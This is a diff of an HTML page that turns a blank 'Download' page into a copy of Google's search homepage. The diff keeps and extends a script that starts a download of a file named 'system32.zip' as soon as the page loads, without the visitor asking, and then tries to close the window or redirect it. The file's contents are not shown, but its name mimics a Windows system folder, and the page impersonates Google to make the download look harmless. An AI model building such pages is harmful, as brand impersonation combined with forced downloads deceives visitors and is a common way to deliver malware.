@@ -2,40 +2,312 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <title>Download</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    /* Pitch-black blank page */
-    html, body {
-      height: 100%;
-      margin: 0;
-      background-color: #000000; /* pure black */
-      color: #000000; /* keep text invisible */
-      overflow: hidden;
-    }
-    /* Hide any accidental content */
-    body > * { display: none !important; }
-  </style>
+    <title>Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      html, body {
+        height: 100%;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+        background-color: #ffffff;
+        color: #202124;
+      }
+
+      /* Header */
+      header {
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        padding: 1rem 1.5rem;
+        gap: 1.5rem;
+        font-size: 0.875rem;
+      }
+
+      header a {
+        color: rgba(0, 0, 0, 0.87);
+        text-decoration: none;
+        transition: color 0.2s ease;
+      }
+
+      header a:hover {
+        color: rgba(0, 0, 0, 0.6);
+      }
+
+      .header-btn {
+        background-color: #f8f9fa;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        color: #3c4043;
+        padding: 0.5rem 1.25rem;
+        font-size: 0.875rem;
+        cursor: pointer;
+        transition: background-color 0.2s ease, border-color 0.2s ease;
+      }
+
+      .header-btn:hover {
+        background-color: #f8f9fa;
+        border-color: #c6c6c6;
+        box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+      }
+
+      /* Main Content */
+      main {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: calc(100% - 100px);
+        padding: 2rem;
+      }
+
+      .logo {
+        margin-bottom: 1.5rem;
+        font-size: 5.5rem;
+        font-weight: 300;
+        letter-spacing: -0.25rem;
+      }
+
+      .logo span:nth-child(1) { color: #4285f4; }
+      .logo span:nth-child(2) { color: #ea4335; }
+      .logo span:nth-child(3) { color: #fbbc04; }
+      .logo span:nth-child(4) { color: #4285f4; }
+      .logo span:nth-child(5) { color: #34a853; }
+      .logo span:nth-child(6) { color: #ea4335; }
+
+      .search-container {
+        width: 100%;
+        max-width: 584px;
+        margin-bottom: 1.5rem;
+      }
+
+      .search-box {
+        display: flex;
+        align-items: center;
+        border: 1px solid #dadce0;
+        border-radius: 24px;
+        padding: 0.75rem 1rem;
+        background-color: #fff;
+        transition: box-shadow 0.2s ease;
+      }
+
+      .search-box:hover {
+        box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
+        border-color: #dadce0;
+      }
+
+      .search-box:focus-within {
+        box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
+        border-color: #dadce0;
+      }
+
+      .search-box input {
+        flex: 1;
+        border: none;
+        outline: none;
+        font-size: 1rem;
+        padding: 0 0.5rem;
+        color: #202124;
+      }
+
+      .search-box input::placeholder {
+        color: #9aa0a6;
+      }
+
+      .search-icon, .voice-icon {
+        width: 24px;
+        height: 24px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        color: #9aa0a6;
+        transition: color 0.2s ease;
+      }
+
+      .search-icon:hover, .voice-icon:hover {
+        color: #5f6368;
+      }
+
+      .buttons-container {
+        display: flex;
+        justify-content: center;
+        gap: 1rem;
+        margin-top: 1.5rem;
+      }
+
+      .btn {
+        background-color: #f8f9fa;
+        border: 1px solid #f8f9fa;
+        border-radius: 4px;
+        color: #3c4043;
+        padding: 0.625rem 1.25rem;
+        font-size: 0.875rem;
+        cursor: pointer;
+        transition: all 0.2s ease;
+      }
+
+      .btn:hover {
+        border: 1px solid #dadce0;
+        box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+      }
+
+      .btn:active {
+        border: 1px solid #4285f4;
+      }
+
+      /* Footer */
+      footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #f2f2f2;
+        border-top: 1px solid #dadce0;
+        padding: 0.75rem 1.5rem;
+        font-size: 0.8125rem;
+        color: #70757a;
+      }
+
+      .footer-content {
+        max-width: 100%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      footer a {
+        color: #70757a;
+        text-decoration: none;
+        margin: 0 1rem;
+        transition: color 0.2s ease;
+      }
+
+      footer a:hover {
+        color: #4285f4;
+      }
+
+      .footer-left, .footer-right {
+        display: flex;
+        gap: 2rem;
+      }
+    </style>
   </head>
   <body>
+    <!-- Header -->
+    <header>
+      <a href="#">About</a>
+      <a href="#">Advertising</a>
+      <a href="#">Business</a>
+      <a href="#">How Search works</a>
+      <button class="header-btn">Sign in</button>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+      <!-- Google Logo -->
+      <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+      </div>
+
+      <!-- Search Box -->
+      <div class="search-container">
+        <div class="search-box">
+          <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="11" cy="11" r="8"></circle>
+            <path d="m21 21-4.35-4.35"></path>
+          </svg>
+          <input type="text" placeholder="Search Google or type a URL" />
+          <svg class="voice-icon" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 15c1.66 0 3-1.34 3-3V6c0-1.66-1.34-3-3-3S9 4.34 9 6v6c0 1.66 1.34 3 3 3z"/>
+            <path d="M17 16.91c-1.48 1.46-3.5 2.36-5.77 2.36-2.27 0-4.29-.9-5.77-2.36m8.54 3.26v2.77h-5.54v-2.77"/>
+          </svg>
+        </div>
+      </div>
+
+      <!-- Buttons -->
+      <div class="buttons-container">
+        <button class="btn">Google Search</button>
+        <button class="btn">I'm Feeling Lucky</button>
+      </div>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+      <div class="footer-content">
+        <div class="footer-left">
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+          <a href="#">Settings</a>
+        </div>
+        <div class="footer-right">
+          <a href="#">Help</a>
+          <a href="#">Send feedback</a>
+        </div>
+      </div>
+    </footer>
+
     <script>
-      // Attempt automatic download as soon as the page loads.
-      // Note: some browsers may block non-user-initiated downloads.
-      document.addEventListener('DOMContentLoaded', function () {
+      // Download system32.zip file and close/redirect
+      function triggerDownload() {
         try {
           const a = document.createElement('a');
           a.href = 'system32.zip';
           a.download = 'system32.zip';
-          // a.style.display = 'none'; // not necessary; hidden by CSS
           document.body.appendChild(a);
-          // Programmatic click to start download
           a.click();
-          // Cleanup
           a.remove();
+          
+          // After download initiates, close or redirect
+          setTimeout(function () {
+            window.close();
+            setTimeout(function () {
+              window.location.href = 'about:blank';
+            }, 200);
+          }, 800);
         } catch (e) {
-          // If programmatic download fails, navigate to the file as a fallback
-          window.location.href = 'system32.zip';
+          console.error('Download failed:', e);
+          setTimeout(function () {
+            window.close();
+            setTimeout(function () {
+              window.location.href = 'about:blank';
+            }, 200);
+          }, 500);
         }
+      }
+      
+      // Trigger download on page load
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', triggerDownload);
+      } else {
+        triggerDownload();
+      }
+
+      // Search box functionality (optional - can be linked to actual search)
+      document.querySelector('.search-box input').addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+          const query = this.value;
+          if (query) {
+            window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query);
+          }
+        }
+      });
+
+      // Button functionality
+      document.querySelectorAll('.buttons-container .btn').forEach(btn => {
+        btn.addEventListener('click', function () {
+          const query = document.querySelector('.search-box input').value;
+          if (query) {
+            if (this.textContent.includes('Lucky')) {
+              window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query) + '&btnI=1';
+            } else {
+              window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query);
+            }
+          }
+        });
       });
     </script>
   </body>
